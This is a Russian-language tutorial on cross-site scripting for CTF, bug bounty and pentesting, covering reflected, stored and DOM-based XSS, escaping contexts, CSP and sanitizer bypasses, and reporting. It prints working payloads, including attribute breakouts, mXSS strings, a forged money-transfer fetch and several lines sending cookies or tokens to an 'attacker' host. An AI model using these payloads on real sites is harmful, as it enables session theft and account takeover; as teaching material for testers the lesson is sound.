XSS (Cross-Site Scripting) — это внедрение JavaScript, который исполняется в браузере жертвы в контексте уязвимого сайта. Последствия: кража cookie/токенов, выполнение действий от имени жертвы (CSRF-в-обход-CSRF), фишинг, кейлоггинг, обход CSP, эксфильтрация данных. XSS делят на три вида: **reflected** (payload в ответе на наш запрос), **stored** (payload сохраняется и отдаётся всем), **DOM-based** (payload исполняется клиентским JS, не доходя до сервера). Этот урок — про виды, контексты, payload'ы, CSP и доказательство.

## Теория: почему возникает

XSS возникает, когда пользовательский ввод попадает в HTML/JS без правильного экранирования. Ключевое слово — **контекст**: одно и то же значение в разных местах HTML требует разного экранирования.

| Контекст | Пример | Что нужно |
|----------|--------|-----------|
| HTML-текст | `<div>USER</div>` | экранировать `<` `>` `&` |
| HTML-атрибут | `<input value="USER">` | экранировать `"` и `<` |
| JS-строка | `var x='USER'` | экранировать `'` `</script>` |
| URL/href | `<a href="USER">` | запретить `javascript:` |
| CSS | `style="color:USER"` | запретить `expression`/`url()` |

Ошибка №1 новичка — считать, что «экранирование угловых скобок» решает всё. В атрибуте нужен другой набор, в JS-строке — третий.

## Reflected vs stored vs DOM-based

**Reflected** — payload приходит в параметре и сразу отражается в ответе. Требует, чтобы жертва кликнула специально составленную ссылку. Не хранится.

**Stored (хранимый)** — payload сохраняется на сервере (комментарий, профиль, сообщение) и отдаётся **всем** посетителям. Опаснее reflected, потому что не требует ссылки: достаточно, чтобы жертва открыла страницу. Именно это и проверяет квиз: хранимый XSS опаснее, потому что срабатывает у всех, кто откроет страницу, без социальной инженерии.

**DOM-based** — сервер не при чём: клиентский JS читает ввод (`location.hash`, `document.referrer`) и вставляет его в опасный sink (`innerHTML`, `eval`, `document.write`). Payload может вообще не попадать на сервер, поэтому серверные фильтры бесполезны.

## Разобранный пример: reflected XSS

```bash
# 1. подаём маркер и ищем отражение
curl -s 'https://t/search?q=XSSTEST'
#   <h1>Результаты для XSSTEST</h1>   -> отражается
# 2. проверяем, экранируются ли спецсимволы
curl -s 'https://t/search?q=<b>1</b>'
#   <h1>Результаты для <b>1</b></h1>   -> HTML не экранируется
# 3. подтверждаем исполнение
curl -s 'https://t/search?q=<script>alert(1)</script>'
```

Если `<b>` интерпретируется как тег, а не как текст — HTML не экранируется. Для доказательства используйте безобидный `alert(1)`/`print(1)` (или `document.domain` в отчёте).

## Разобранный пример: payload в атрибуте

В контексте `<input value="USER">` нельзя просто вставить `<script>` (он не сработает внутри атрибута). Нужно выйти из атрибута:

```html
"><script>alert(1)</script>
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
```

Первый закрывает кавычку и тег `input`, затем вставляет свой тег. Второй использует обработчик события. Именно поэтому квиз спрашивает про payload в атрибуте — там `<script>` не работает, нужен breakout + событие.

## Разобранный пример: DOM-based XSS

Клиентский код: `document.getElementById('x').innerHTML = location.hash.substring(1)`.

```bash
curl -s 'https://t/#<img src=x onerror=alert(1)>'
```

Сервер вернёт тот же HTML, но браузер исполнит `onerror`. Проверять нужно в реальном браузере (DevTools), а не только curl'ом.

## Cookie-флаги и кража сессии

```js
new Image().src = 'https://attacker/?c=' + document.cookie;
```

Флаг **`HttpOnly`** делает cookie недоступной для `document.cookie`, что мешает этому payload'у. Поэтому в квизе правильный ответ — `HttpOnly`. Но даже с `HttpOnly` можно выполнять действия от имени жертвы (fetch к API) — то есть XSS остаётся опасным.

## CSP и обход

`Content-Security-Policy: script-src 'self'` без `unsafe-inline` запрещает inline-`<script>` и `on*`-обработчики. Что тогда сработает? Загрузка скрипта **с того же origin** (например, через загрузку файла) или через разрешённый домен:

```html
<script src="/uploads/evil.js"></script>
```

Поэтому квиз спрашивает: при `script-src 'self'` без `unsafe-inline` сработает загрузка внешнего скрипта с того же origin, а не inline. Обходы CSP: JSONP-эндпоинты, Angular-шаблоны, `base-uri`, DOM-clobbering (см. `web-csp-bypass`).

## Инструменты

- **Burp Repeater/Intruder** — перебор контекстов и payload'ов.
- **`xss_detect`** — проверка отражения/экранирования.
- **XSStrike/Dalfox** — автоматический поиск и генерация payload'ов.
- **DevTools Console** — проверка DOM-based.

```bash
# Dalfox: быстрый поиск XSS
dalfox url 'https://t/search?q=1'
dalfox file urls.txt --cookie 'sess=...'
```

## Типичные ошибки новичков

- **Использовать `<script>` везде.** В атрибуте/JS-строке он не работает.
- **Путать отражение и исполнение.** Отражение без контекста ≠ XSS.
- **Не проверять DOM-based в браузере.** curl его не видит.
- **Считать `HttpOnly` полной защитой.** Действия от имени жертвы остаются.
- **Игнорировать CSP.** Он меняет набор рабочих payload'ов.
- **Считать, что экранирование `<`/`>` достаточно.** Контекст решает.

## Что делать дальше / решение

1. Найдите все точки отражения (параметры, заголовки, тело).
2. Определите контекст (HTML/атрибут/JS/URL/CSS).
3. Подберите payload под контекст.
4. Для stored — сохраните и откройте страницу заново.
5. Для DOM — проверьте в браузере (hash/referrer/innerHTML).
6. Учтите CSP, при необходимости обойдите (`web-csp-bypass`).
7. Доведите до артефакта: `document.cookie`/действие от имени жертвы/скриншот alert.

## Разобранный пример: stored XSS в профиле

Дано: поле «о себе» сохраняется и отдаётся на странице профиля.

```bash
# 1. сохраняем payload
curl -s -b jar -X POST https://t/profile \
  --data-urlencode 'bio=<script>fetch("https://attacker/?c="+document.cookie)</script>'
# 2. открываем профиль — payload исполняется
curl -s -b jar https://t/profile | grep -i '<script>fetch'
# 3. в логах листенера видим cookie жертвы
```

Stored XSS не требует ссылки: любой, кто откроет профиль, выполнит код. Если страницу просматривает администратор — можно украсть его сессию и захватить аккаунт. Это делает stored XSS одним из самых опасных видов.

## mXSS и обход санитайзеров

Если приложение использует санитайзер (DOMPurify и т.п.), проверьте **mutation XSS (mXSS)**: браузер «перепарсит» DOM и превратит «безопасную» разметку в исполняемую.

```html
<!-- санитайзер видит текст, браузер — тег -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
```

Также обходят санитайзеры через **DOM clobbering** (переопределение глобальных переменных элементами с `id`/`name`) и через **prototype pollution** (см. `web-dom-clobbering`, `web-prototype-pollution`). Правило: наличие санитайзера — это начало работы, а не конец.

## Кража токенов и обход HttpOnly

Даже если cookie `HttpOnly`, XSS остаётся опасным:

```js
// читаем CSRF-токен из DOM и делаем действие от имени жертвы
fetch('/api/transfer', {method:'POST', credentials:'include',
  body: JSON.stringify({to:'attacker', amount:1000})});
// крадём токен из localStorage (если он там)
new Image().src='https://attacker/?t='+localStorage.getItem('token');
```

Так XSS превращается в «CSRF без CSRF-токена»: браузер сам добавит cookie, а запрос пойдёт с того же origin.

## Отчёт по XSS: что доказывать

Хороший отчёт содержит:

1. **Точный контекст** (HTML/атрибут/JS/DOM).
2. **Минимальный payload** (`<script>alert(1)</script>` или короче).
3. **Доказательство исполнения** — скриншот/видео `alert`/`print`, либо OOB-запрос к вашему листенеру.
4. **Влияние** — кража сессии, действие от имени жертвы, чтение приватных данных.
5. **Обход защиты**, если был (CSP/WAF/санитайзер).

Плохой отчёт: «payload отражается в ответе». Хороший: «payload исполняется в браузере и позволяет украсть сессию администратора».

## Итог

XSS — это не один баг, а семейство, зависящее от контекста и клиентской логики. Методология: найдите точки отражения/хранения → определите контекст → подберите payload → проверьте DOM-based в браузере → учтите CSP/санитайзер → доведите до артефакта (cookie/действие/скриншот). Помните три вещи: `<script>` не работает в атрибутах и JS-строках; DOM-based XSS не виден серверным фильтрам; санитайзер и CSP — это препятствие, а не гарантия безопасности.
## Быстрый чек-лист по XSS

1. Найдите точки отражения (параметры, заголовки, тело, фрагмент URL).
2. Определите контекст: HTML / атрибут / JS-строка / href / CSS.
3. Подайте `XSSTEST` и найдите его в ответе.
4. Проверьте, интерпретируется ли `<b>1</b>` как HTML.
5. Подберите payload под контекст (см. таблицу).
6. Для stored — сохраните и откройте страницу заново (в другом сеансе).
7. Для DOM — проверьте в браузере (`innerHTML`/`eval`/`document.write`).
8. Учтите CSP (`script-src`), при `'self'` — грузите скрипт со своего origin.
9. Проверьте санитайзер на mXSS/DOM-clobbering.
10. Докажите влияние: `document.cookie`/действие от имени жертвы/скриншот alert.
## Почему `alert(1)` — это только доказательство, а не цель

`alert(1)`/`print(1)` — безопасный способ показать, что JavaScript исполняется. Но реальная ценность XSS — в действиях от имени жертвы и в краже данных. В отчёте всегда переходите от «сработал alert» к конкретному влиянию: украденная cookie/токен, выполненный перевод средств, прочитанные приватные сообщения, захваченный аккаунт администратора. Если страница под CSP и `alert` не проходит, докажите исполнение через `fetch('//oob')` — OOB-запрос виден в вашем листенере, что не зависит от всплывающих окон и настроек браузера.

## Reflected vs stored: почему это важно для отчёта

Reflected XSS требует, чтобы жертва открыла вашу ссылку — это социальная инженерия, и в отчёте её «ценность» ниже. Stored XSS срабатывает сам у всех, кто откроет страницу, поэтому его приоритет выше: часто именно он приводит к захвату аккаунта администратора. При тестировании всегда проверяйте, сохраняется ли payload (комментарии, профиль, сообщения, логи, поля заявок) — и если да, это уже stored, даже если изначально выглядело как reflected.

## Где пригодится

- **CTF (Web):** XSS часто используется для «доставки» эксплойта боту-админу (steal cookie → флаг), особенно в задачах с ботом.
- **Bug bounty:** XSS на чувствительных страницах (с токенами, админках) — высокооплачиваемая находка; хранимый в админке — почти всегда critical.
- **Пентест:** XSS входит в OWASP Top 10 (A03) и обязателен в отчёте; реальная демонстрация — с крафтом вредоносной страницы.
- **Работа (AppSec):** контекстно-зависимое экранирование, CSP, `HttpOnly` — базовые средства защиты, которые проверяет безопасник.
